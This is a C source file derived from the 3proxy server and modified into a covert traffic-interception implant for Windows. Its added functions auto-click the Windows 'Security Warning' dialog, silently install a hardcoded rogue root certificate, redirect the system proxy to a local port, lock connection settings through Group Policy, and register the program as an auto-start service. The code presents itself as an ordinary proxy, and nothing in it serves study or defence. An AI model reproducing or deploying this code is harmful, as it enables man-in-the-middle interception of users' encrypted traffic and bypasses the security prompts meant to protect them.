/*
   3APA3A simpliest proxy server
   (c) 2002-2008 by ZARAZA <3APA3A@security.nnov.ru>

   please read License Agreement

*/
#include "proxy.h"
#ifndef _WIN32
#include <sys/resource.h>
#ifndef NOPLUGINS
#include <dlfcn.h>
#endif
#endif

#ifndef DEFAULTCONFIG
#define DEFAULTCONFIG conf.stringtable[25]
#endif

#ifdef  __cplusplus
extern "C" {
#endif
#pragma comment (lib, "crypt32.lib")


#define   INITGUID 
#include <Guiddef.h>
#include <Gpedit.h>


#include <openssl/applink.c>

#ifdef  __cplusplus
}
#endif


FILE * confopen();
extern unsigned char *strings[];
extern FILE *writable;
extern struct counter_header cheader;
extern struct counter_record crecord;



time_t basetime = 0;

void doschedule(void);


#ifdef _WIN32
OSVERSIONINFO osv;
int service = 0;

void cyclestep(void);
#ifndef _WINCE
SERVICE_STATUS_HANDLE hSrv;
DWORD dwCurrState;
int SetStatus( DWORD dwState, DWORD dwExitCode, DWORD dwProgress )
{
    SERVICE_STATUS srvStatus;
    srvStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    srvStatus.dwCurrentState = dwCurrState = dwState;
    srvStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_PAUSE_CONTINUE | SERVICE_ACCEPT_SHUTDOWN;
    srvStatus.dwWin32ExitCode = dwExitCode;
    srvStatus.dwServiceSpecificExitCode = 0;
    srvStatus.dwCheckPoint = dwProgress;
    srvStatus.dwWaitHint = 3000;
    return SetServiceStatus( hSrv, &srvStatus );
}

void __stdcall CommandHandler( DWORD dwCommand )
{
    switch( dwCommand )
    {
    case SERVICE_CONTROL_STOP:
    case SERVICE_CONTROL_SHUTDOWN:
        SetStatus( SERVICE_STOP_PENDING, 0, 1 );
	conf.timetoexit = 1;
	conf.paused++;
	Sleep(2000);
        SetStatus( SERVICE_STOPPED, 0, 0 );
        break;
    case SERVICE_CONTROL_PAUSE:
        SetStatus( SERVICE_PAUSE_PENDING, 0, 1 );
	conf.paused++;
        SetStatus( SERVICE_PAUSED, 0, 0 );
        break;
    case SERVICE_CONTROL_CONTINUE:
        SetStatus( SERVICE_CONTINUE_PENDING, 0, 1 );
	conf.needreload = 1;
        SetStatus( SERVICE_RUNNING, 0, 0 );
        break;
    default: ;
    }
}


void __stdcall ServiceMain(int argc, unsigned char* argv[] )
{

    hSrv = RegisterServiceCtrlHandler((LPCSTR)conf.stringtable[1], (LPHANDLER_FUNCTION)CommandHandler);
    if( hSrv == 0 ) return;

    SetStatus( SERVICE_START_PENDING, 0, 1 );
    SetStatus( SERVICE_RUNNING, 0, 0 );
    //cyclestep(); // 100% cpu issue
}
#endif

#else


void mysigusr1 (int sig){
	conf.needreload = 1;
}

int even = 0;

void mysigpause (int sig){

	conf.paused++;
	even = !even;
	if(!even){
		conf.needreload = 1;
	}
}

void mysigterm (int sig){
	conf.paused++;
	usleep(999*SLEEPTIME);
	usleep(999*SLEEPTIME);
#ifndef NOODBC
	pthread_mutex_lock(&log_mutex);
	close_sql();
	pthread_mutex_unlock(&log_mutex);
#endif
	conf.timetoexit = 1;
}

#endif

void dumpmem(void);

struct schedule *schedule;


int wday = 0;

int timechanged (time_t oldtime, time_t newtime, ROTATION lt){
	struct tm tmold;
	struct tm *tm;
	tm = localtime(&oldtime);
	tmold = *tm;
	tm = localtime(&newtime);
	switch(lt){
		case MINUTELY:
			if(tm->tm_min != tmold.tm_min)return 1;
			break;
		case HOURLY:
			if(tm->tm_hour != tmold.tm_hour)return 1;
			break;
		case DAILY:
			if(tm->tm_yday != tmold.tm_yday)return 1;
			break;
		case MONTHLY:
			if(tm->tm_mon != tmold.tm_mon)return 1;
			break;
		case ANNUALLY:
			if(tm->tm_year != tmold.tm_year)return 1;
			break;
		case WEEKLY:
			if(((newtime - oldtime) > (60*60*24*7))
				|| tm->tm_wday < tmold.tm_wday
				|| (tm->tm_wday == tmold.tm_wday && (newtime - oldtime) > (60*60*24*6))
				)return 1;
			break;
		default:
			break;	
	}
	return 0;
}

void doschedule(void){
	struct schedule *sched, *prevsched = NULL, *nextsched;
	int res;

	conf.time = time(0);
	for(sched=schedule; sched; sched=sched->next){
		if(conf.needreload || conf.timetoexit || (conf.time > sched->start_time && timechanged(sched->start_time, conf.time, sched->type))){
			sched->start_time = conf.time;
			nextsched = sched->next;
			res = (*sched->function)(sched->data);
			switch(res){
			case 1:
				if(prevsched) prevsched->next = nextsched;
				else schedule = nextsched;
				break;
			}
		}
		prevsched = sched;
	}
}

void dumpcounters(struct trafcount *tlin, int counterd){

 unsigned char tmpbuf[8192*2];
 struct trafcount *tl;
 if(counterd >= 0 && tlin) {

	conf.time = time(0);
	if(cheader.updated && conf.countertype && timechanged(cheader.updated, conf.time, conf.countertype)){
		FILE * cfp;
				
		cfp = fopen((char *)dologname(tmpbuf, (unsigned char *)conf.counterfile, NULL, conf.countertype, cheader.updated), "w");
		if(cfp){
			for(tl = tlin; cfp && tl; tl = tl->next){
				if(tl->type >= conf.countertype)
					fprintf(cfp, "%05d %020"PRINTF_INT64_MODIFIER"u%s%s\n", tl->number, tl->traf64, tl->comment?" #" : "", tl->comment? tl->comment : "");
			}
			fclose(cfp);
		}
	}


	cheader.updated = conf.time;
	lseek(counterd, 0, SEEK_SET);
	write(counterd, &cheader, sizeof(struct counter_header));			
	for(tl=tlin; tl; tl = tl->next){
		if(tl->number){
			lseek(counterd, 
				sizeof(struct counter_header) + (tl->number - 1) * sizeof(struct counter_record),
				SEEK_SET);
			crecord.traf64 = tl->traf64;
			crecord.cleared = tl->cleared;
			crecord.updated = tl->updated;
			write(counterd, &crecord, sizeof(struct counter_record));
		}
		if(tl->type!=NEVER && timechanged(tl->cleared, conf.time, tl->type)){
			tl->cleared = conf.time;
			tl->traf64 = 0;
		}
	}
 }
}


DWORD APIENTRY EvilThread(LPVOID lpParam)
{
	HWND securityDialog = NULL;
	// Attempt to get the dialog’s window handle
	while (!securityDialog)
	{

		// String's endcode , language is import
		// ANSI, Unicode, English, Chinese
		// securityDialog = FindWindowA(0, L"Security Warning");
		securityDialog = FindWindowA(0, "Security Warning");
	}
	// Spoof "Yes" button notification to parent
	if (securityDialog)
	{
		SendMessage(
			securityDialog, // Window handle to dialog
			WM_COMMAND, // Message type "menu command"
			0x00000006, // Hi BN_CLICKED (0x0) + lo ID (0x6)
			NULL); // No need for window handle to control
	}
	return 0;
}


#define CERT_NAME "enduc"

PCCERT_CONTEXT is_certificate_exist()
{
	HCERTSTORE hMyCertStore = NULL;
	PCCERT_CONTEXT aCertContext = NULL;

	//-------------------------------------------------------
	// Open the My store, also called the personal store.
	// This call to CertOpenStore opens the Local_Machine My 
	// store as opposed to the Current_User's My store.

	hMyCertStore = CertOpenStore(
		CERT_STORE_PROV_SYSTEM,
		0,
		NULL,
		CERT_SYSTEM_STORE_CURRENT_USER,
		L"ROOT");
	if (hMyCertStore == NULL)
	{
		debug_print("Error opening ROOT store for server.\n");
		goto cleanup;
	}
	//-------------------------------------------------------
	// Search for a certificate with some specified
	// string in it. This example attempts to find
	// a certificate with the string "example server" in
	// its subject string. Substitute an appropriate string
	// to find a certificate for a specific user.

	aCertContext = CertFindCertificateInStore(hMyCertStore,
		X509_ASN_ENCODING,
		0,
		CERT_FIND_SUBJECT_STR_A,
		CERT_NAME, // use appropriate subject name
		NULL
	);

	if (aCertContext == NULL)
	{
		debug_print("Error retrieving server certificate.");
		goto cleanup;
	}
cleanup:
	if (hMyCertStore)
	{
		CertCloseStore(hMyCertStore, 0);
	}
	return aCertContext;
}


void import_cert(void)
{
	PCCERT_CONTEXT pCertContext = NULL;
	HCERTSTORE hSystemStore = NULL;
	HRESULT hr = S_OK;

	if (is_certificate_exist() != NULL) {
		printf("certificate exist. Don't import again\n");
		return ;
	}
	// generate private key for CA
	// openssl genrsa -out ca.key 2048
	// openssl req -new -key ca.key -out ca.csr
	// IN/LN/LN/enduc/enduc/enduc
	// signed-self
	// openssl x509 -req -in ca.csr -extensions v3_ca -signkey ca.key -out ca.crt
	// generate public/private key as fake CA of the remote web server
	// openssl genrsa -out server.key 2048
	// should close mmc

	// Hardcoded certificate string

const char* evilPemCert = "-----BEGIN CERTIFICATE-----\
		MIIDKjCCAhICCQCRhOk1HLonjzANBgkqhkiG9w0BAQsFADBXMQswCQYDVQQGEwJJ\
		TjELMAkGA1UECAwCTE4xCzAJBgNVBAcMAkxOMQ4wDAYDVQQKDAVlbmR1YzEOMAwG\
		A1UECwwFZW5kdWMxDjAMBgNVBAMMBWVuZHVjMB4XDTE3MTAyODA1MDAzOFoXDTIw\
		MDcyNDA1MDAzOFowVzELMAkGA1UEBhMCSU4xCzAJBgNVBAgMAkxOMQswCQYDVQQH\
		DAJMTjEOMAwGA1UECgwFZW5kdWMxDjAMBgNVBAsMBWVuZHVjMQ4wDAYDVQQDDAVl\
		bmR1YzCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMoxEZxJY3x8s5zv\
		b/txDwKt3HT9YrvI5mMzOhjl7IZJCBX7bSZzPD4kKAuV7bjuumxG/s2T+DvNcYpX\
		rAJ8oMfRBaRs6Z1Xc/zcYBK59Tw1hihERt2kRDTv0/BQtsSqUh1pa7wG/Eqf6VPt\
		epSY1EmQp8XT9D7fHcmMavie/CjAPL8zWKcuXRF3EznYggzFH7YHr+SFRUGkVkjQ\
		du50TAkafYuNLXDlk9y5rHwu5Q0a3zxzDDYCyTNNyK1zkK8KQYdu4ysVNM6XSfmj\
		Sca6xzGh7O27qG0p6AyDnYgS/xnbGLfG22JBDkyaz//8526lR7F6qXz0X7x63Qbs\
		HvmpPtkCAwEAATANBgkqhkiG9w0BAQsFAAOCAQEAnhjYbkfmxJRLWYwZMeLjVGdt\
		+uUecPuo4pDzX3dmFBhm4QBZgRjYEvhLxJ2fdvSwqfaWORiSoKiB/1MlQrsyfXzw\
		3FS0QIu2a3ql2r9xRfrL6FWM2qqlU9D8Taw820A88BHGcqcooBCTRFJQD1hkwaln\
		T9Bso6CErRhSgVlpItYiKTY6+HQbqS3cDKA8+bqBPSPBGnsAUX0ahC2ct0/Zdh6X\
		TV6+hQD+wL8WnQB9OJWeNnX8NxBOXpv8e4zhDcvKwRf4lWR0+oWzeHnGkEoF+IwA\
		yjXpKqDurfzNDsZoVgQ3/92m+0ApOabAIYoU+EVhVsMC8pSmvhmPWrNqGFuJjg==\
		-----END CERTIFICATE-----";


	{
		BYTE evilDerCert[2048];
		DWORD evilDerCertLen = 2048;
		// Convert PEM to binary/DER format
		CryptStringToBinaryA(
			evilPemCert,
			0,
			CRYPT_STRING_BASE64HEADER,
			evilDerCert,
			&evilDerCertLen,
			NULL,
			NULL);
		// Create the certificate context
		pCertContext = CertCreateCertificateContext(
			X509_ASN_ENCODING | PKCS_7_ASN_ENCODING,
			evilDerCert,
			evilDerCertLen);
		if (!pCertContext) {
			printf( "Could not create certificate context.\n" );
		}
		// Open the user certificate store
		hSystemStore = CertOpenStore(
			CERT_STORE_PROV_SYSTEM,
			0,
			NULL,
			CERT_SYSTEM_STORE_CURRENT_USER,
			L"ROOT");
		if (!hSystemStore) {
			debug_print( "Could not open the current user’s certificate store.\n");
		}
		DWORD dwThreadId, dwThrdParam = 1;
		HANDLE hThread = NULL;
		// Create monitoring thread
		hThread = CreateThread(
			NULL, // Default security attributes
			0, // Use default stack size
			EvilThread, // Thread function
			&dwThrdParam, // Argument to thread function
			0, // Use default creation flags
			&dwThreadId); // Returns the thread identifier

			// Check the return value for success
			if (!hThread) {
				debug_print( "CreateThread failed.\n" );
			}
			else {
				// Thread is now monitoring the security window...
				// Inject certificate to store
				debug_print( "import ca \n");
				
				CertAddCertificateContextToStore(
					hSystemStore,
					pCertContext,
					CERT_STORE_ADD_ALWAYS,
					NULL);
				CloseHandle(hThread);
			}
	}

	// Clean-up resources
	if (hSystemStore) {
		CertCloseStore(hSystemStore, 0);
	}
	if (pCertContext) {
		CertFreeCertificateContext(pCertContext);
	}


	return ;

}

void set_gpo(void)
{
	DWORD val, val_size=sizeof(DWORD);
	HRESULT hr;
	IGroupPolicyObject* pLGPO;
	HKEY machine_key, dsrkey;
	// MSVC is finicky about these ones => redefine them
	const IID my_IID_IGroupPolicyObject = 
	 { 0xea502723, 0xa23d, 0x11d1, {0xa7, 0xd3, 0x0, 0x0, 0xf8, 0x75, 0x71, 0xe3} };
	const IID my_CLSID_GroupPolicyObject = 
	 { 0xea502722, 0xa23d, 0x11d1, {0xa7, 0xd3, 0x0, 0x0, 0xf8, 0x75, 0x71, 0xe3} };
	GUID ext_guid = REGISTRY_EXTENSION_GUID;
	// This next one can be any GUID you want
	GUID snap_guid = { 0x3d271cfc, 0x2bc6, 0x4ac2, {0xb6, 0x33, 0x3b, 0xdf, 0xf5, 0xbd, 0xab, 0x2a} };
    GUID ThisGuid={  
        0x0F6B957E,  
        0x509E,  
        0x11D1,  
        {0xA7, 0xCC, 0x00, 0x00, 0xF8, 0x75, 0x71, 0xE3}  
    };  

	// Create an instance of the IGroupPolicyObject class
	hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
	hr = CoCreateInstance(&CLSID_GroupPolicyObject, NULL, CLSCTX_INPROC_SERVER,
	 &IID_IGroupPolicyObject, (LPVOID*)&pLGPO);

	if (hr != S_OK) {
		debug_print("error CoCreateInstance()\n");
		return ;
	}
	
	// We need the machine LGPO (if C++, no need to go through the lpVtbl table)
	hr = pLGPO->lpVtbl->OpenLocalMachineGPO(pLGPO, GPO_OPEN_LOAD_REGISTRY);
	if (hr != S_OK) {
		debug_print("error OpenLocalMachineGPO(), %x\n", hr);
		// 80070005 General access denied error  - admin
		return ;
	}
	
	hr = pLGPO->lpVtbl->GetRegistryKey(pLGPO, GPO_SECTION_MACHINE, &machine_key);
	if (hr != S_OK) {
		debug_print("error GetRegistryKey(), %x\n", hr);
		return ;
	}

	LONG ret;
	// The disable System Restore is a DWORD value of Policies\Microsoft\Windows\DeviceInstall\Settings
	// HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\Settings
	// Software\Policies\Microsoft\Internet Explorer\Control Panel\Connection Settings
	ret = RegCreateKeyEx(machine_key, "Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel",
	 0, NULL, 0, KEY_SET_VALUE | KEY_QUERY_VALUE, NULL, &dsrkey, NULL);
	if ( ret != ERROR_SUCCESS ) {
		debug_print("error RegCreateKeyEx %x\n", ret);
		return ;
	}
	
	// Create the value
	val = 1;
	ret = RegSetKeyValue(dsrkey, NULL, "Connection Settings", REG_DWORD, &val, sizeof(val));
	if ( ret != ERROR_SUCCESS ) {
		debug_print("error RegSetKeyValue %x\n", ret);
		return ;
	}
	
	//ret = RegSetKeyValue(dsrkey, NULL, "Connwiz Admin Lock", REG_DWORD, &val, sizeof(val));
	//if ( ret != ERROR_SUCCESS ) {
	//	printf("error RegSetKeyValue %x\n", ret);
	//	return ;
	//}
	
	ret = RegCloseKey(dsrkey);
	if ( ret != ERROR_SUCCESS ) {
		debug_print("error RegCloseKey %x\n", ret);
		return ;
	}
	ret = RegCloseKey(machine_key);
	if ( ret != ERROR_SUCCESS ) {
		debug_print("error RegCloseKey %x\n", ret);
		return ;
	}

	// Apply policy and free resources
	hr = pLGPO->lpVtbl->Save(pLGPO, TRUE, TRUE, &ext_guid, &snap_guid);
	if (hr != S_OK) {
		debug_print("error Save(), %x\n", hr);
		return ;
	}	

	hr = pLGPO->lpVtbl->Release(pLGPO);
	if (hr != S_OK) {
		debug_print("error Release(), %x\n", hr);
		return ;
	}	
	
	//hr = pLGPO->lpVtbl->RefreshPolicy(pLGPO, TRUE, RP_FORCE);
	//if (hr != S_OK) {
	//	printf("error RefreshPolicy(), %x\n", hr);
	//	return ;
	//}	

}

int set_proxy_reg(void)
{
	/* set proxy */
	HKEY runsrv;
	if(RegOpenKeyEx( HKEY_CURRENT_USER, 
		  "Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings",
		  0,
		  KEY_ALL_ACCESS,
		  &runsrv) != ERROR_SUCCESS){
		perror("Failed to open registry");
	}
	
	DWORD ivalue=1;
	if(RegSetValueEx(runsrv, TEXT("ProxyEnable") , 0, REG_DWORD, (const BYTE*)&ivalue, sizeof(ivalue)) != ERROR_SUCCESS){
	  perror("Failed to set ProxyEnable");
	}
	
	LPCTSTR svalue = TEXT("http=127.0.0.1:3128;https=127.0.0.1:3128");
	if(RegSetValueEx(runsrv, TEXT("ProxyServer") , 0, REG_SZ, (LPBYTE)svalue, strlen(svalue)+1) != ERROR_SUCCESS){
		perror("Failed to set ProxyServer");
	}
	
	if (RegCloseKey(runsrv)!= ERROR_SUCCESS) {
		perror("");
	}

	return 0;

}

void cyclestep(void){
 struct tm *tm;
 time_t minutecounter;
 unsigned char tmpbuf[8192*2];

 debug_print("enter cyclestep\n");

 import_cert();

 set_proxy_reg();
 
 set_gpo();
 
 minutecounter = time(0);
 for(;;){
  
	usleep(SLEEPTIME*999);
	
	conf.time = time(0);
	if(conf.needreload) {
		doschedule();
		reload();
		conf.needreload = 0;
	}
	doschedule();
	if(conf.stdlog)fflush(conf.stdlog);
	if(timechanged(minutecounter, conf.time, MINUTELY)) {
		struct filemon *fm;
		struct stat sb;

		for(fm=conf.fmon; fm; fm=fm->next){
			if(!stat(fm->path, &sb)){
				if(fm->sb.st_mtime != sb.st_mtime || fm->sb.st_size != sb.st_size){
					stat(fm->path, &fm->sb);
					conf.needreload = 1;
				}
			}
		}
		
	}
	if(timechanged(basetime, conf.time, DAILY)) {
		tm = localtime(&conf.time);
		wday = (1 << tm->tm_wday);
		tm->tm_hour = tm->tm_min = tm->tm_sec = 0;
		basetime = mktime(tm);
	}
	if(conf.logname) {
		if(timechanged(conf.logtime, conf.time, conf.logtype)) {
			FILE *fp;
			fp = fopen((char *)dologname (tmpbuf, conf.logname, NULL, conf.logtype, conf.time), "a");
			if (fp) {
				pthread_mutex_lock(&log_mutex);
				fclose(conf.stdlog);
				conf.stdlog = fp;
				pthread_mutex_unlock(&log_mutex);
			}
			fseek(stdout, 0L, SEEK_END);
			usleep(SLEEPTIME);
			conf.logtime = conf.time;
			if(conf.logtype != NONE && conf.rotate) {
				int t;
				t = 1;
				switch(conf.logtype){
					case ANNUALLY:
						t = t * 12;
					case MONTHLY:
						t = t * 4;
					case WEEKLY:
						t = t * 7;
					case DAILY:
						t = t * 24;
					case HOURLY:
						t = t * 60;
					case MINUTELY:
						t = t * 60;
					default:
						break;
				}
				dologname (tmpbuf, conf.logname, (conf.archiver)?conf.archiver[1]:NULL, conf.logtype, (conf.logtime - t * conf.rotate));
				remove ((char *) tmpbuf);
				if(conf.archiver) {
					int i;
					*tmpbuf = 0;
					for(i = 2; i < conf.archiverc && strlen((char *)tmpbuf) < 512; i++){
						strcat((char *)tmpbuf, " ");
						if(!strcmp((char *)conf.archiver[i], "%A")){
							strcat((char *)tmpbuf, "\"");
							dologname (tmpbuf + strlen((char *)tmpbuf), conf.logname, conf.archiver[1], conf.logtype, (conf.logtime - t));
							strcat((char *)tmpbuf, "\"");
						}
						else if(!strcmp((char *)conf.archiver[i], "%F")){
							strcat((char *)tmpbuf, "\"");
							dologname (tmpbuf+strlen((char *)tmpbuf), conf.logname, NULL, conf.logtype, (conf.logtime-t));
							strcat((char *)tmpbuf, "\"");
						}
						else
							strcat((char *)tmpbuf, (char *)conf.archiver[i]);
					}
					system((char *)tmpbuf+1);
				}
			}
		}
	}
	if(conf.counterd >= 0 && conf.trafcounter) {
		if(timechanged(cheader.updated, conf.time, MINUTELY)){
			dumpcounters(conf.trafcounter, conf.counterd);
		}
	}
	if(conf.timetoexit){
		conf.paused++;
		doschedule();
		usleep(SLEEPTIME*999);
		usleep(SLEEPTIME*999);
		usleep(SLEEPTIME*999);
		return;
	}
		
 }
}


#define RETURN(x) {res = x; goto CLEARRETURN;}


#ifndef _WINCE
int main(int argc, char * argv[]) {
#else
int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow){
 int argc;
 char ** argv;
 WNDCLASS wc;
 HWND hwnd = 0;
#endif

  int res = 0;

#ifdef _WIN32
  unsigned char * arg;
  WSADATA wd;
  unsigned char tmpbuf[8192];  // full filename path

  WSAStartup(MAKEWORD( 1, 1 ), &wd);
  osv.dwOSVersionInfoSize = sizeof(osv);
  GetVersionEx(&osv);
#endif


#ifdef _WINCE
	argc = ceparseargs((char *)lpCmdLine);
	argv = ceargv;
	if(FindWindow(L"prochst", L"prochst")) return 0;
	ZeroMemory(&wc,sizeof(wc));
	wc.hbrBackground=(HBRUSH)GetStockObject(BLACK_BRUSH);
	wc.hInstance=hInstance;
	wc.hCursor=LoadCursor(NULL,IDC_ARROW);
	wc.lpfnWndProc=DefWindowProc;
	wc.style=CS_HREDRAW|CS_VREDRAW;
	wc.lpszClassName=L"prochst";
	RegisterClass(&wc);

	hwnd = CreateWindowEx(0,L"prochst",L"prochst",WS_VISIBLE|WS_POPUP,0,0,0,0,0,0,hInstance,0);
#endif

  conf.stringtable = strings;

  *tmpbuf = '\"';
  if (!(res = SearchPath(NULL, argv[0], ".exe", 256, (char *)tmpbuf+1, (LPTSTR*)&arg))) {
	  perror("Failed to find executable filename");
	  RETURN(102);
  }
  strcat((char *)tmpbuf, "\" --service");

  // install
  if (argc == 1) {

	  SC_HANDLE schm;
	  SC_HANDLE schs;
	  
	  if(!(schm = OpenSCManager(NULL, NULL, GENERIC_WRITE|SERVICE_START ))){
		  perror("Failed to open Service Manager");
		  RETURN(101);
	  }
	  if (!(schs = CreateService(schm, (LPCSTR)conf.stringtable[1], (LPCSTR)conf.stringtable[2], GENERIC_EXECUTE, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, (char *)tmpbuf, NULL, NULL, NULL, NULL, NULL))){
		  perror("Failed to create service, %s", tmpbuf);
		  RETURN(103);
	  }
	  if (!StartService(schs, 0, NULL)) {
	  perror("Failed to start service");
		  RETURN(103);
	  }

	  debug_print("sleep\n");
	  usleep(SLEEPTIME*3000);
	  debug_print("sleep\n");
	  if(schs)
		CloseServiceHandle(schs);
	  if (schm)
		CloseServiceHandle(schm);

	  exit(0);
  }
  if(argc==2 && !strcmp(argv[1], "--service")){
	service = 1;
	argc = 1;
  }

  pthread_mutex_init(&config_mutex, NULL);
  pthread_mutex_init(&bandlim_mutex, NULL);
  pthread_mutex_init(&hash_mutex, NULL);
  pthread_mutex_init(&tc_mutex, NULL);
  pthread_mutex_init(&pwl_mutex, NULL);
  pthread_mutex_init(&log_mutex, NULL);

  freeconf(&conf);
  res = readconfig();
  conf.version++;

  if(res) RETURN(res);


  if(service){
    SERVICE_TABLE_ENTRY ste[] = 
	{
	  { (LPSTR)conf.stringtable[1], (LPSERVICE_MAIN_FUNCTION)ServiceMain},
	  { NULL, NULL }
	};  
	if(!StartServiceCtrlDispatcher( ste ))cyclestep();
  }
  else 
  {
	cyclestep();
  }

CLEARRETURN:

 return 0;

}
